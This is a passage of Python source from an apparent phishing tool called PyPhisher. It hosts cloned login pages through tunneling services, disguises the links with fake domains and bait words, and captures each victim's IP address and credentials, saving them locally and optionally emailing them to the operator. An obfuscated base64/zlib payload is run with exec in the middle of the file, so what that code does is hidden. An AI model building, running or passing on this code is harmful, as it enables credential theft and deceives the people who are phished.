            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
                # Remove slash and spaces from mask
                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
                copy(fol, site_dir)
                return fol
            else:
                sprint(f"\n{error}index.php/index.html required but not found!")
        else:
            sprint(f"\n{error}Directory do not exists!")

# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return

# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}PyPhisher{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return


# Optional function for ngrok url masking
def masking(url):
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if cust=="":
        return
    shortened1 = shortener1(url)
    if shortened1 != "":
        shortened = shortened1
    else:
        shortened2 = shortener2(url)
        shortened = shortened2
    if shortened != "":
        short = shortened.replace("https://", "")
    else:
        sprint(f"{error}Service not available!")
        waiter()
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
        domain = "https://"
    else:
        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
        domain = "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bcyan}{final}")


# Staring functions

# Update of PyPhisher
def updater():
    internet()
    if not isfile("files/pyphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        append(e, error_file)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        clear(fast=True)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            shell("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# Installing packages and downloading tunnelers
def requirements():
    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
    if termux:
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            shell("termux-setup-storage")
    internet()
    if termux:
        if not is_installed("proot"):
            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    isngrok = isfile(f"{tunneler_dir}/ngrok")
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    isloclx = isfile(f"{tunneler_dir}/loclx")
    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
        if isfile("ngrok.tgz"):
            extract("ngrok.tgz", f"{tunneler_dir}")
            remove("ngrok.tgz")
    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    if isfile("loclx.zip"):
        extract("loclx.zip", f"{tunneler_dir}")
        remove("loclx.zip")
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("ngrok"):
        nr_command = "ngrok"
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if is_installed("localxpose"):
        lx_command = "localxpose"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        nr_token()
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed")
            sleep(1)

# Main Menu to choose phishing type

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'EehVQNw/f/+7537L1mgINRnOTsZRdcRIT9JehMOOR58APRKcgmYFQQzct97a9q3deNx3nYRGCCR4Gmx9WTXlUfl7nIFWMEuGoHb+h8JEM2C+ZO+psoRNS7szrN3SchXn/L9UqXSy0XNFhvk8U/jFJWRhBSLH7Fd/D00hVjHKnp7lZ7FQKWdvtxebByWw4o79FYfAo4XH6w0X/IzWRXKUBhqploPf1ZAZHPkt48J6hAvNldThlw2a3hwhqrlWh0ksl7rz8zmsr1eO33WLT3Sh3cKDHqP3vltSZOlVGayo/Y5QXj8XWfL/CE5kZBZOplPRWbzhhQ0Laq+9zNw+v2bAZgTLSAbfXXEnNTUdoVkOi48buO+GZ25GUCXQmyHjeiOeUSp69TMYzrGEam1Tm4XjGZWvWVmTOWUAiwuyi3xyJYAlEBRYK3q48Px0hYDhLWpKlYFw+ggjO7pMXbmv+u9z6FvcjskpxuBlttpwjy4gecDNj/dqe4NiIMwGuS6Qf9EOZhdUQsc/6ngxK7pQWJ+Cc5lJYUTDC1YM+mBdTDyGoLfmC5To+krdDncweVMZC/qKVgy9p5X1vZNQBHWL46Ba0f2KOzOdJQJrgIJLUpPR0N+VwzWcp87ipM1BWQhSivJwzmRmsCzNEG9SZhd8HIKT42rK6JRIF7KfTYdSus+yV2zAAHctCBTdFL+ABZAXbJBiNF74NyRhemMTww17k8tN6eY11UDFKGIyElbXiCiCmhMxyop/iGBdb94pkvRUhJqHbLg++g9c6v4M2HfU2tCX5g6SMHnu75+LaDvjJ7my8642878fAi1oXUy9skSy1J+k3YxbMojD9AOhjd2F7MvPYcpzvQ2yIYRuTxS61es2X07mByAj3QnBJqAq+s8iAzIJyPex81gzup+pGcTByKf6Xc0PPJBi5E202JbZbgikdo3HQt/zjEuU6fQRC/TADSBS5QdxajTFgd/dKGpO8LK6mc6v+k+RVtxG69BQyvxqmyTZ28ncRlLs/GRKSB2OYu3Qpxz0He6pzQitgDVz9vgM0Mgu3JtAAAzDB3pqz1jnbFSJX8GsE2di8THVlK/16dJ7YoL9iGpcZDkPPmK6iLB6h2rYIP+65juOayLn5JstNRicfHQD8YRN0k3+WPTdiSLVcCfi2m08+ZbfB9VxOTqpbGwRvbKybA1kBNsTwqK15IDaZFjLOIYBkMPWXQM09xg8rdiHvKnlRAm3Skj/sNUZbZp4vLHiRz4s0bf98y57wI+8eJGuG5NwG7x3hhcQZUSLyh43fqBMECwn7wir5DXjf4pRxr1a8TTG3lnYf4J0CHvu/LPKbZTnWOqJJu4gO3hwxjQhNbswH/ohK/wb+mOysZ2kRNnRVQl9I5dRPaoiHdwQy7YFJaeBQSWzpWodAqVq3JS4jSOcEqdMFezvLc7UbGjDOnxfd+4l56wn0DETR4fLLLfN6H6r3gO5Rs4qwxTtU8lrS2TjX/cdXCGegOo6bXd0tU0F6mCEEgj7w5Ln1hR272M8FTLM/A7Ru6TQXSeE44m+fxVruD8bSJkK9R9GVhNw01tJy1oKmH4vkf7l/uSqbqtyWUfJm9XQmJV7n32FYbIGvc1Qb53h+PV/9//nPr+m5e7EDi7OdVPbLJBBPiTHmc3dQsNggpK/lHNQCoFpSUE1NwJe'))

# Start server and tunneling
def server():
    global mode
    clear()
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file, lx_file, lhr_file]:
        delete(logfile)
        if not isfile(logfile):
            mknod(logfile)
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    lx_log = open(lx_file, "w")
    lhr_log = open(lhr_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{nr_command} http {arguments} {local_url}")
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
    if key:
        bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    else:
        bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    sleep(10)
    try:
        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
        nr_url = nr_api["tunnels"][0]["public_url"]
    except Exception as e:
        append(e, error_file)
        nr_url = ""
    if nr_url != "":
        nr_success=True
    else:
        nr_success=False
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)
    lx_success = False
    for i in range(10):
        lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
        if lx_url != "https://":
            lx_success = True
            break
        sleep(1)
    lhr_success = False
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        sleep(1)
    if nr_success or cf_success or lx_success or lhr_success:
        sprint(f"\n{info}Your urls are given below:")
        if mode == "test":
            print(f"\n{info}URL Generation completed successfully!")
            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
            pexit()
        if nr_success:
            url_manager(nr_url, "Ngrok", "NR Masked")
        if cf_success:
            url_manager(cf_url, "CloudFlared", "CF Masked")
        if lx_success:
            url_manager(lx_url, "LocalXpose", "LX Masked")
        if lhr_success:
            url_manager(lhr_url, "LocalHR", "LHR Masked")
        if nr_success and tunneler.lower() == "ngrok":
            masking(nr_url)
        elif lx_success and tunneler.lower() == "loclx":
            masking(lx_url)
        elif lhr_success and tunneler.lower() == "localhostrun":
            masking(lhr_url)
        elif cf_success and tunneler.lower() == "cloudflared":
            masking(cf_url)
        else:
            print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!